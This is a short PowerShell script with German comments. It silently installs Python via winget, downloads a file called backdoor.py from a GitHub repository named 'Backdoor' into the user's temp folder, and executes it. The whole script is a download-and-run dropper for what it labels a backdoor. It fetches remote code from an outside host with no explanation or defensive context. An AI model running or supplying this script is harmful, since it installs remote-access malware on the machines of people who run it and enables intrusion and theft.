# 1. Python installieren (winget, still)
winget install Python.Python.3.13 --silent --accept-package-agreements --accept-source-agreements

# 2. Zieldatei von GitHub herunterladen
$targetUrl = "https://raw.githubusercontent.com/KibaYuuto/Backdoor/main/backdoor.py"
$outFile = "$env:TEMP\backdoor.py"
Invoke-WebRequest -Uri $targetUrl -OutFile $outFile -UseBasicParsing

# 3. Mit Python ausführen
python $outFile
